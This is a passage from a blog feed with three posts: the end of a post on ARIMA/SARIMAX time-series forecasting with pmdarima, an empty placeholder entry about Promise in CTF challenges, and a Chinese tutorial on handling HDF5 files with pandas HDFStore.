class="number">0</span>)</span><br><span class="line"></span><br><span class="line">model = pm.auto_arima(df.value, start_p=<span class="number">1</span>, start_q=<span class="number">1</span>,</span><br><span class="line">                      test=<span class="string">&#x27;adf&#x27;</span>,       <span class="comment"># use adftest to find optimal &#x27;d&#x27;</span></span><br><span class="line">                      max_p=<span class="number">3</span>, max_q=<span class="number">3</span>, <span class="comment"># maximum p and q</span></span><br><span class="line">                      m=<span class="number">1</span>,              <span class="comment"># frequency of series</span></span><br><span class="line">                      d=<span class="literal">None</span>,           <span class="comment"># let model determine &#x27;d&#x27;</span></span><br><span class="line">                      seasonal=<span class="literal">False</span>,   <span class="comment"># No Seasonality</span></span><br><span class="line">                      start_P=<span class="number">0</span>, </span><br><span class="line">                      D=<span class="number">0</span>, </span><br><span class="line">                      trace=<span class="literal">True</span>,</span><br><span class="line">                      error_action=<span class="string">&#x27;ignore&#x27;</span>,  </span><br><span class="line">                      suppress_warnings=<span class="literal">True</span>, </span><br><span class="line">                      stepwise=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(model.summary())</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Performing stepwise search <span class="keyword">to</span> minimize aic</span><br><span class="line"> ARIMA(1,2,1)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=525.587, <span class="attribute">Time</span>=0.21 sec</span><br><span class="line"> ARIMA(0,2,0)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=533.474, <span class="attribute">Time</span>=0.01 sec</span><br><span class="line"> ARIMA(1,2,0)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=532.437, <span class="attribute">Time</span>=0.04 sec</span><br><span class="line"> ARIMA(0,2,1)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=525.893, <span class="attribute">Time</span>=0.09 sec</span><br><span class="line"> ARIMA(0,2,0)(0,0,0)[0]             : <span class="attribute">AIC</span>=531.477, <span class="attribute">Time</span>=0.03 sec</span><br><span class="line"> ARIMA(2,2,1)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=515.248, <span class="attribute">Time</span>=0.20 sec</span><br><span class="line"> ARIMA(2,2,0)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=513.459, <span class="attribute">Time</span>=0.18 sec</span><br><span class="line"> ARIMA(3,2,0)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=515.284, <span class="attribute">Time</span>=0.16 sec</span><br><span class="line"> ARIMA(3,2,1)(0,0,0)[0] intercept   : <span class="attribute">AIC</span>=inf, <span class="attribute">Time</span>=1.25 sec</span><br><span class="line"> ARIMA(2,2,0)(0,0,0)[0]             : <span class="attribute">AIC</span>=511.465, <span class="attribute">Time</span>=0.14 sec</span><br><span class="line"> ARIMA(1,2,0)(0,0,0)[0]             : <span class="attribute">AIC</span>=530.444, <span class="attribute">Time</span>=0.09 sec</span><br><span class="line"> ARIMA(3,2,0)(0,0,0)[0]             : <span class="attribute">AIC</span>=513.291, <span class="attribute">Time</span>=0.32 sec</span><br><span class="line"> ARIMA(2,2,1)(0,0,0)[0]             : <span class="attribute">AIC</span>=513.256, <span class="attribute">Time</span>=0.33 sec</span><br><span class="line"> ARIMA(1,2,1)(0,0,0)[0]             : <span class="attribute">AIC</span>=523.592, <span class="attribute">Time</span>=0.19 sec</span><br><span class="line"> ARIMA(3,2,1)(0,0,0)[0]             : <span class="attribute">AIC</span>=inf, <span class="attribute">Time</span>=1.68 sec</span><br><span class="line"></span><br><span class="line">Best model:  ARIMA(2,2,0)(0,0,0)[0]          </span><br><span class="line">Total fit time: 4.991 seconds</span><br><span class="line">                               SARIMAX Results                                </span><br><span class="line">==============================================================================</span><br><span class="line">Dep. Variable:                      y   <span class="literal">No</span>. Observations:                  100</span><br><span class="line">Model:               SARIMAX(2, 2, 0)   Log Likelihood                -252.732</span><br><span class="line">Date:                Fri, 20 May 2022   AIC                            511.465</span><br><span class="line">Time:                        12:29:31   BIC                            519.220</span><br><span class="line">Sample:                             0   HQIC                           514.601</span><br><span class="line">                                - 100                                         </span><br><span class="line">Covariance Type:                  opg                                         </span><br><span class="line">==============================================================================</span><br><span class="line">                 coef    std err          z      P&gt;|z|      [0.025      0.975]</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">ar.L1          0.2579      0.103      2.510      0.012       0.056       0.459</span><br><span class="line">ar.L2         -0.4407      0.087     -5.093      0.000      -0.610      -0.271</span><br><span class="line">sigma2        10.1268      1.519      6.668      0.000       7.150      13.103</span><br><span class="line">===================================================================================</span><br><span class="line">Ljung-Box (L1) (Q):                   0.05   Jarque-Bera (JB):                 0.10</span><br><span class="line">Prob(Q):                              0.82   Prob(JB):                         0.95</span><br><span class="line">Heteroskedasticity (H):               0.49   Skew:                            -0.07</span><br><span class="line">Prob(H) (two-sided):                  0.05   Kurtosis:                         2.92</span><br><span class="line">===================================================================================</span><br><span class="line"></span><br><span class="line">Warnings:</span><br><span class="line">[1] Covariance matrix calculated using the outer product of gradients (complex-step).</span><br></pre></td></tr></table></figure><p>I met a bug here</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ARIMA</span>(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>] intercept   : AIC=inf, Time=<span class="number">1</span>.<span class="number">25</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=<span class="number">511</span>.<span class="number">465</span>, Time=<span class="number">0</span>.<span class="number">14</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=<span class="number">530</span>.<span class="number">444</span>, Time=<span class="number">0</span>.<span class="number">09</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=<span class="number">513</span>.<span class="number">291</span>, Time=<span class="number">0</span>.<span class="number">32</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=<span class="number">513</span>.<span class="number">256</span>, Time=<span class="number">0</span>.<span class="number">33</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=<span class="number">523</span>.<span class="number">592</span>, Time=<span class="number">0</span>.<span class="number">19</span> sec</span><br><span class="line"><span class="attribute">ARIMA</span>(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)[<span class="number">0</span>]             : AIC=inf, Time=<span class="number">1</span>.<span class="number">68</span> sec</span><br></pre></td></tr></table></figure><p>why AIC == inf ?</p><h2 id="How-to-build-SARIMAX-Model-with-exogenous-variable"><a href="#How-to-build-SARIMAX-Model-with-exogenous-variable" class="headerlink" title="How to build SARIMAX Model with exogenous variable"></a>How to build SARIMAX Model with exogenous variable</h2><p><a href="https://raw.githubusercontent.com/selva86/datasets/master/a10.csv">https://raw.githubusercontent.com/selva86/datasets/master/a10.csv</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Import Data</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;https://raw.githubusercontent.com/selva86/datasets/master/a10.csv&#x27;</span>, parse_dates=[<span class="string">&#x27;date&#x27;</span>], index_col=<span class="string">&#x27;date&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compute Seasonal Index</span></span><br><span class="line"><span class="keyword">from</span> statsmodels.tsa.seasonal <span class="keyword">import</span> seasonal_decompose</span><br><span class="line"><span class="keyword">from</span> dateutil.parser <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiplicative seasonal component</span></span><br><span class="line">result_mul = seasonal_decompose(data[<span class="string">&#x27;value&#x27;</span>][-<span class="number">36</span>:],   <span class="comment"># 3 years</span></span><br><span class="line">                                model=<span class="string">&#x27;multiplicative&#x27;</span>, </span><br><span class="line">                                extrapolate_trend=<span class="string">&#x27;freq&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seasonal_index = result_mul.seasonal[-<span class="number">12</span>:].to_frame()</span><br><span class="line">seasonal_index[<span class="string">&#x27;month&#x27;</span>] = pd.to_datetime(seasonal_index.index).month</span><br><span class="line"></span><br><span class="line"><span class="comment"># merge with the base data</span></span><br><span class="line">data[<span class="string">&#x27;month&#x27;</span>] = data.index.month</span><br><span class="line">df = pd.merge(data, seasonal_index, how=<span class="string">&#x27;left&#x27;</span>, on=<span class="string">&#x27;month&#x27;</span>)</span><br><span class="line">df.columns = [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;seasonal_index&#x27;</span>]</span><br><span class="line">df.index = data.index  <span class="comment"># reassign the index.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pmdarima <span class="keyword">as</span> pm</span><br><span class="line"></span><br><span class="line"><span class="comment"># SARIMAX Model</span></span><br><span class="line">sxmodel = pm.auto_arima(df[[<span class="string">&#x27;value&#x27;</span>]], exogenous=df[[<span class="string">&#x27;seasonal_index&#x27;</span>]],</span><br><span class="line">                           start_p=<span class="number">1</span>, start_q=<span class="number">1</span>,</span><br><span class="line">                           test=<span class="string">&#x27;adf&#x27;</span>,</span><br><span class="line">                           max_p=<span class="number">3</span>, max_q=<span class="number">3</span>, m=<span class="number">12</span>,</span><br><span class="line">                           start_P=<span class="number">0</span>, seasonal=<span class="literal">True</span>,</span><br><span class="line">                           d=<span class="literal">None</span>, D=<span class="number">1</span>, trace=<span class="literal">True</span>,</span><br><span class="line">                           error_action=<span class="string">&#x27;ignore&#x27;</span>,  </span><br><span class="line">                           suppress_warnings=<span class="literal">True</span>, </span><br><span class="line">                           stepwise=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">sxmodel.summary()</span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/157960700">https://zhuanlan.zhihu.com/p/157960700</a></p><p><a href="https://stackoverflow.com/questions/44235558/statespace-sarimax-model-why-the-model-use-all-the-data-to-train-mode-and-pred">https://stackoverflow.com/questions/44235558/statespace-sarimax-model-why-the-model-use-all-the-data-to-train-mode-and-pred</a></p><p><a href="https://analyticsindiamag.com/complete-guide-to-sarimax-in-python-for-time-series-modeling/">https://analyticsindiamag.com/complete-guide-to-sarimax-in-python-for-time-series-modeling/</a></p><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p><a href="https://stats.stackexchange.com/questions/160612/auto-arima-doesnt-calculate-aic-values-for-the-majority-of-models">https://stats.stackexchange.com/questions/160612/auto-arima-doesnt-calculate-aic-values-for-the-majority-of-models</a></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="parameter"><a href="#parameter" class="headerlink" title="parameter"></a>parameter</h3><p><a href="https://alkaline-ml.com/pmdarima/tips_and_tricks.html">https://alkaline-ml.com/pmdarima/tips_and_tricks.html</a></p><h3 id="How-to-decide-m"><a href="#How-to-decide-m" class="headerlink" title="How to decide m?"></a>How to decide m?</h3><p>In my code, maybe I need to set m = 7.</p><ul><li>7 - daily</li><li>12 - monthly</li><li>52 - weekly</li></ul><p>let’s take a look at one question</p><blockquote><p> I have two large time series data. One is separated by seconds intervals and the other by minutes. The length of each time series is 180 days. I’m using R (3.1.1) for forecasting the data. I’d like to know the value of the “frequency” argument in the ts() function in R, for each data set. Since most of the examples and cases I’ve seen so far are for months or days at the most, it is quite confusing for me when dealing with equally separated seconds or minutes. According to my understanding, the “frequency” argument is the number of observations per season. So what is the “season” in the case of seconds/minutes? My guess is that since there are 86,400 seconds and 1440 minutes a day, these should be the values for the “freq” argument. Is that correct?</p></blockquote><p>Yes, the “frequency”is the number of observations per “cycle” (normally a year, but sometimes a week, a day or an hour). This is the opposite of the definition of frequency in physics, or in Fourier analysis, where “period” is the length of the cycle, and “frequency” is the inverse of period. When using the <code>ts()</code> function in R, the following choices should be used.</p><table><thead><tr><th align="left">Data</th><th align="left">Frequency</th></tr></thead><tbody><tr><td align="left">Annual</td><td align="left">1</td></tr><tr><td align="left">Quarterly</td><td align="left">4</td></tr><tr><td align="left">Monthly</td><td align="left">12</td></tr><tr><td align="left">Weekly</td><td align="left">52</td></tr></tbody></table><p>Actually, there are not 52 weeks in a year, but 365.25/7 = 52.18 on average, allowing for a leap year every fourth year. But most functions which use <code>ts</code> objects require integer frequency.</p><p>If the frequency of observations is greater than once per week, then there is usually more than one way of handling the frequency. For example, data with daily observations might have a weekly seasonality (frequency=7) or an annual seasonality (frequency=365.25). Similarly, data that are observed every minute might have an hourly seasonality (frequency=60), a daily seasonality (frequency=24x60=1440), a weekly seasonality (frequency=24x60x7=10080) and an annual seasonality (frequency=24x60x365.25=525960). If you want to use a <code>ts</code> object, then you need to decide which of these is the most important.</p><p>An alternative is to use a <code>msts</code> object (defined in the <code>forecast</code> package) which handles multiple seasonality time series. Then you can specify all the frequencies that might be relevant. It is also flexible enough to handle non-integer frequencies.</p><table><thead><tr><th align="left"></th><th align="right">Frequencies</th><th align="right"></th><th align="right"></th><th align="right"></th><th align="right"></th></tr></thead><tbody><tr><td align="left">Data</td><td align="right">Minute</td><td align="right">Hour</td><td align="right">Day</td><td align="right">Week</td><td align="right">Year</td></tr><tr><td align="left">Daily</td><td align="right"></td><td align="right"></td><td align="right"></td><td align="right">7</td><td align="right">365.25</td></tr><tr><td align="left">Hourly</td><td align="right"></td><td align="right"></td><td align="right">24</td><td align="right">168</td><td align="right">8766</td></tr><tr><td align="left">Half-hourly</td><td align="right"></td><td align="right"></td><td align="right">48</td><td align="right">336</td><td align="right">17532</td></tr><tr><td align="left">Minutes</td><td align="right"></td><td align="right">60</td><td align="right">1440</td><td align="right">10080</td><td align="right">525960</td></tr><tr><td align="left">Seconds</td><td align="right">60</td><td align="right">3600</td><td align="right">86400</td><td align="right">604800</td><td align="right">31557600</td></tr></tbody></table><p>You won’t necessarily want to include all of these frequencies — just the ones that are likely to be present in the data. For example, any natural phenomena (e.g., sunshine hours) is unlikely to have a weekly period, and if your data are measured in one-minute intervals over a 3 month period, there is no point including an annual frequency.</p><p>For example, the <code>taylor</code> data set from the <code>forecast</code> package contains half-hourly electricity demand data from England and Wales over about 3 months in 2000. It was defined as</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taylor &lt;- msts(x, seasonal.periods=c(48,336)</span><br></pre></td></tr></table></figure><p>One convenient model for multiple seasonal time series is a TBATS model:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taylor.fit &lt;- tbats(taylor)</span><br><span class="line">plot(forecast(taylor.fit))</span><br></pre></td></tr></table></figure><p>(Warning: this takes a few minutes.)</p><p>If an <code>msts</code> object is used with a function designed for <code>ts</code> objects, the largest seasonal period is used as the “frequency” attribute.</p><h2 id="Some-ideas-and-questions"><a href="#Some-ideas-and-questions" class="headerlink" title="Some ideas and questions?"></a>Some ideas and questions?</h2><ul><li>The ARIMA model seems to process good result for short-term forecasting, but it is difficult to get results in the long-term prediction. So it seems unconvincing to use the ARIMA model as a comparative experiment in long-term forecasting?</li><li>In my experiments, I found that a more accurate setting of the seasonal(parameter m) resulted in increased training time and made it difficult for my experiments to continue.</li></ul><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://otexts.com/fpp2/stationarity.html">https://otexts.com/fpp2/stationarity.html</a></p><p><a href="https://people.duke.edu/~rnau/411home.htm">https://people.duke.edu/~rnau/411home.htm</a></p><p><a href="https://www.machinelearningplus.com/time-series/arima-model-time-series-forecasting-python/">https://www.machinelearningplus.com/time-series/arima-model-time-series-forecasting-python/</a></p><p><a href="https://www.youtube.com/watch?v=ikkOBWQj9X8">https://www.youtube.com/watch?v=ikkOBWQj9X8</a></p><p><a href="https://www.machinelearningplus.com/time-series/augmented-dickey-fuller-test/">https://www.machinelearningplus.com/time-series/augmented-dickey-fuller-test/</a></p><p><a href="https://robjhyndman.com/hyndsight/seasonal-periods/">https://robjhyndman.com/hyndsight/seasonal-periods/</a></p><p><a href="https://alkaline-ml.com/pmdarima/modules/generated/pmdarima.arima.auto_arima.html">https://alkaline-ml.com/pmdarima/modules/generated/pmdarima.arima.auto_arima.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/157960700">https://zhuanlan.zhihu.com/p/157960700</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;learn learn~~&lt;/p&gt;</summary>
    
    
    
    <category term="ML" scheme="http://example.com/categories/ML/"/>
    
    
    <category term="时间序列" scheme="http://example.com/tags/%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Promise在ctf中的应用</title>
    <link href="http://example.com/2022/05/17/Promise-ctf/"/>
    <id>http://example.com/2022/05/17/Promise-ctf/</id>
    <published>2022-05-17T13:04:05.000Z</published>
    <updated>2022-05-17T13:04:55.739Z</updated>
    
    <content type="html"><![CDATA[<p>先留个坑好吧 最近太忙了 没空研究</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;先留个坑好吧 最近太忙了 没空研究&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="js" scheme="http://example.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章带你读懂h5文件格式</title>
    <link href="http://example.com/2022/05/17/h5-learn/"/>
    <id>http://example.com/2022/05/17/h5-learn/</id>
    <published>2022-05-17T11:54:38.000Z</published>
    <updated>2022-05-17T12:34:51.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>学长发给我的h5文件不会处理 直接寄</p><span id="more"></span><h2 id="what-is-h5"><a href="#what-is-h5" class="headerlink" title="what is h5"></a>what is h5</h2><p>H5⽂件是层次数据格式第5代的版本（Hierarchical Data Format，HDF5），它是⽤于存储科学数据的⼀种⽂件格式和库⽂件。由美国超级<br>计算中⼼与应⽤中⼼研发的⽂件格式,⽤以存储和组织⼤规模数据。</p><p>h5⽂件为⼀个存放数据的容器，包括group名称和datasets，group名称为key，datasets为value，⽂件结构如下图：</p><img src="/2022/05/17/h5-learn/image-20220517195807386.png" alt="image-20220517195807386" style="zoom: 67%;"><h2 id="how-to-write-read-form-a-h5-file"><a href="#how-to-write-read-form-a-h5-file" class="headerlink" title="how to write/read form a h5 file"></a>how to write/read form a h5 file</h2><p><code>pandas</code>中的<code>HDFStore()</code>用于生成管理HDF5文件IO操作的对象，其主要参数如下：</p><ul><li><p><code>path</code>：字符型输入，用于指定h5文件的名称（不在当前工作目录时需要带上完整路径信息）</p></li><li><p><code>mode</code>：用于指定IO操作的模式，与Python内建的open()中的参数一致，默认为’a’，即当指定文件已存在时不影响原有数据写入，指定文件不存在时则新建文件；’r’，只读模式；’w’，创建新文件（会覆盖同名旧文件）；’r+’，与’a’作用相似，但要求文件必须已经存在；</p></li><li><p><code>complevel</code>：int型，用于控制h5文件的压缩水平，取值范围在0-9之间，越大则文件的压缩程度越大，占用的空间越小，但相对应的在读取文件时需要付出更多解压缩的时间成本，默认为0，代表不压缩</p></li></ul><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>下面我们创建一个HDF5 IO对象store：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">store = pd.HDFStore(<span class="string">&#x27;demo.h5&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;查看store类型&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(store)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Closing remaining open files:demo.h5...done</span><br><span class="line">&lt;class <span class="string">&#x27;pandas.io.pytables.HDFStore&#x27;</span>&gt;</span><br><span class="line">File path: demo.h5</span><br></pre></td></tr></table></figure><p>可以看到<code>store</code>对象属于<code>pandas</code>的<code>io</code>类，通过上面的语句我们已经成功的初始化名为<code>demo.h5</code>的的文件，本地也相应的出现了如下的文件：</p><img src="/2022/05/17/h5-learn/image-20220517200723762.png" alt="image-20220517200723762"><p>接下来我们创建<code>pandas</code>中不同的两种对象，并将它们共同保存到<code>store</code>中，首先创建<code>series</code>对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas  <span class="keyword">as</span> pd</span><br><span class="line"><span class="comment">#创建一个series对象</span></span><br><span class="line">s = pd.Series(np.random.randn(<span class="number">5</span>), index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">s</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a    1.524228</span><br><span class="line">b   -1.909646</span><br><span class="line">c   -0.408305</span><br><span class="line">d   -1.426960</span><br><span class="line">e    0.074508</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure><p>接着我们创建一个<code>dataframe</code>对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个dataframe对象</span></span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">8</span>, <span class="number">3</span>),</span><br><span class="line">                 columns=[<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">          A         B         C</span><br><span class="line">0 -0.736821  1.260558 -0.488464</span><br><span class="line">1  1.684255  0.210597  0.210070</span><br><span class="line">2 -1.640647  0.779703  0.191109</span><br><span class="line">3  0.868605 -0.036337 -2.000597</span><br><span class="line">4  0.161616  0.450955 -0.111758</span><br><span class="line">5 -0.910792  0.514466  1.036666</span><br><span class="line">6 -0.408943 -1.324511 -0.543415</span><br><span class="line">7  1.249088 -1.155877  0.457727</span><br></pre></td></tr></table></figure><p>第一种方式利用键值对将不同的数据存入store对象中 这里为了代码简洁使用了元组赋值法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store[<span class="string">&#x27;s&#x27;</span>],store[<span class="string">&#x27;df&#x27;</span>] = s,df</span><br></pre></td></tr></table></figure><p>第二种方式利用<code>store</code>对象的<code>put()</code>方法，其主要参数如下：</p><p><code>key</code>：指定h5文件中待写入数据的key</p><p><code>value</code>：指定与key对应的待写入的数据</p><p><code>format</code>：字符型输入，用于指定写出的模式，’fixed’对应的模式速度快，但是不支持追加也不支持检索；’table’对应的模式以表格的模式写出，速度稍慢，但是支持直接通过store对象进行追加和表格查询操作</p><p>使用<code>put()</code>方法将数据存入<code>store</code>对象中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store.put(key=<span class="string">&#x27;s&#x27;</span>,value=s);store.put(key=<span class="string">&#x27;df&#x27;</span>,value=df)</span><br></pre></td></tr></table></figure><p>既然是键值对的格式，那么可以查看store的items属性（注意这里store对象只有items和keys属性，没有values属性）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store.items()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store.keys()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/17/h5-learn/image-20220517202814541.png" alt="image-20220517202814541"></p><p>调用store对象中的数据直接用对应的键名来索引即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store[<span class="string">&#x27;df&#x27;</span>]</span><br></pre></td></tr></table></figure><img src="/2022/05/17/h5-learn/image-20220517202325081.png" alt="image-20220517202325081" style="zoom: 67%;"><p>删除store对象中指定数据的方法有两种，一是使用remove()方法，传入要删除数据对应的键：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store.remove(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(store.keys())</span><br></pre></td></tr></table></figure><p>二是使用Python中的关键词del来删除指定数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> store[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(store.keys())</span><br></pre></td></tr></table></figure><p>这时若想将当前的store对象持久化到本地，只需要利用close()方法关闭store对象即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">store.close()</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;查看store连接状况，False则代表已关闭&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">store.is_open</span><br></pre></td></tr></table></figure><p>这时本地的h5文件也相应的存储进store对象关闭前包含的文件</p><p>除了通过定义一个确切的store对象的方式，还可以从pandas中的数据结构直接导出到本地h5文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建新的数据框</span></span><br><span class="line">df_ = pd.DataFrame(np.random.randn(<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line"><span class="comment">#导出到已存在的h5文件中，这里需要指定key</span></span><br><span 